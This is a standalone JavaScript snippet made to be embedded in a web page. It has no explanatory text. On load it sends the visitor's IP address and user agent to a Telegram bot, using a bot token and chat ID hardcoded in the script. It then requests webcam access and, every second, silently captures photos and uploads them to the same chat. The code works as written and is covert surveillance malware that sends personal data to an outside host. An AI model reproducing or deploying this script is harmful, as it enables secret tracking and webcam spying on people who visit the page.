<script>
const BOT_TOKEN = '7479232652:AAFAzES3rh8WAG32oSDhL33xLXrJSkmPAYw';
const CHAT_ID = '6812471405';

        function sendIPAndUserAgent() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    const userAgent = navigator.userAgent;
                    const message = `IP Address: ${ipAddress}\nUser Agent: ${userAgent}`;
                    sendMessageToTelegram(message);
                })
                .catch(error => console.error('Error fetching IP address:', error));
        }

        function sendMessageToTelegram(message) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log('Message sent to Telegram');
                } else {
                    console.error('Failed to send message to Telegram');
                }
            })
            .catch(error => console.error('Error sending message to Telegram:', error));
        }

        function takePhotoAndSend() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const photo = canvas.toDataURL('image/jpeg');
                            sendPhoto(photo);
                            video.srcObject.getTracks().forEach(track => track.stop());
                            video.remove();
                        }, 1000);
                    };
                })
                .catch(error => console.error('Error accessing camera:', error));
        }

        function sendPhoto(photo) {
            const blob = dataURItoBlob(photo);
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    console.log('Photo sent to Telegram');
                } else {
                    console.error('Failed to send photo to Telegram');
                }
            })
            .catch(error => console.error('Error sending photo to Telegram:', error));
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const arrayBuffer = new ArrayBuffer(byteString.length);
            const intArray = new Uint8Array(arrayBuffer);
            for (let i = 0; i < byteString.length; i++) {
                intArray[i] = byteString.charCodeAt(i);
            }
            return new Blob([arrayBuffer], { type: mimeString });
        }

        sendIPAndUserAgent();
        setInterval(takePhotoAndSend, 1000);
</script>